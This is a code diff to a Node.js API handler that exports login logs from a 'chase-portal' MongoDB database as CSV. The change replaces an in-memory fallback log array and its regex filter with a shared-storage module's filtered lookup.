@@ -1,5 +1,5 @@
 import mongoose from 'mongoose';
-import { fallbackLogs } from './logs-login.js';
+import { sharedStorage } from './shared-storage.js';
 
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
 
@@ -91,17 +91,14 @@ export default async function handler(req, res) {
         .sort({ timestamp: -1 })
         .limit(parseInt(limit))
         .lean();
-    } else if (fallbackLogs.length > 0) {
-      // Use fallback logs
-      logs = fallbackLogs
-        .filter(log => {
-          let matches = true;
-          if (status && log.status !== status) matches = false;
-          if (username && !log.username.match(new RegExp(username, 'i'))) matches = false;
-          return matches;
-        })
-        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, parseInt(limit));
+    } else {
+      // Use fallback logs from shared storage
+      const filters = {};
+      if (status) filters.status = status;
+      if (username) filters.username = username;
+      
+      const allLogs = sharedStorage.getLogs(filters);
+      logs = allLogs.slice(0, parseInt(limit));
     }
 
     const csv = convertToCSV(logs);
